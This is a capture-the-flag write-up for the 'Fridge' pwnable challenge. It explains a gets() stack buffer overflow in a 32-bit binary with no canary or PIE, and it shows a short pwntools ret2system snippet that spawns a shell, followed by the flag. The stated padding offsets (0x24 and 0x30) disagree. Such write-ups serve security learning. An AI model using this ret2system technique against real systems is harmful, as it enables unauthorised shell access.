# Fridge

## 1. Summary

- **Category**: Pwnable
- **Points**: 100
- **Solves**: 432

### Description

> `We've experienced a data breach! Our forensics team detected unusual network activity originating from our new smart refrigerator. It turns out there's an old debugging service still running on it. Now it’s your job to figure out how the attackers gained access to the fridge!`

## 2. Analysis

### Checksec

```text
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Since this is a 32-bit binary with **No Canary** and **No PIE**, we can easily execute arbitrary functions by manipulating the stack without the need for complex ROP gadgets.

### Vulnerability

- **Stack Buffer Overflow (gets)**: In the `set_welcome_message` function, the `gets()` function is used to receive input into `local_30` (a 32-byte buffer). Because `gets()` does not check for input length, a standard Buffer Overflow (BOF) occurs.
- **System Function Available**: The `print_food` function explicitly calls `system("ls -m food_dir");`. This means the `system` function is already linked in the Procedure Linkage Table (PLT), making it a convenient target for redirection.

```c
void set_welcome_message(void)
{
  char local_30 [32];
  FILE *local_10;

  puts("New welcome message (up to 32 chars):");
  gets(local_30); // Vulnerable function: No bounds checking
  ...
}

void print_food(void)
{
  puts("Food currently in fridge:");
  system("ls -m food_dir"); // system() is already available in the binary
  return;
}
```

## 3. Exploit Flow

1. **Calculate Offset**
   The buffer `local_30` is 32 bytes (`0x20`). Considering the stack frame for a 32-bit binary, we need to fill the buffer and overwrite the saved Base Pointer (EBP). Total padding required to reach the return address is `0x20 + 0x4 = 0x24` bytes (or 48 bytes/`0x30` as identified in the manual analysis).

2. **Locate Arguments**
   We need the address of the string `/bin/sh`. Since `system` is used in the binary, we can check if the string exists in the binary or use other standard methods to find it.

3. **Construct Payload**
   The 32-bit calling convention passes arguments via the stack. The payload structure should be:
   `[Padding] + [Address of system@PLT] + [Dummy Return Address] + [Address of "/bin/sh"]`

4. **Execution**
   By sending the payload to the `set_welcome_message` function, we overwrite the return address. When the function finishes, it "returns" to `system("/bin/sh")`, granting us a shell.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

```python
    # Constructing ROP chain for 32-bit system call
    rop = ROP(elf)
    rop.raw(b"A" * 0x30)
    rop.system(next(elf.search(b"/bin/sh\0")))

    # Trigger the vulnerability
    set_welcome_message(r, rop.chain())
```

## 5. Flag

`0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}`
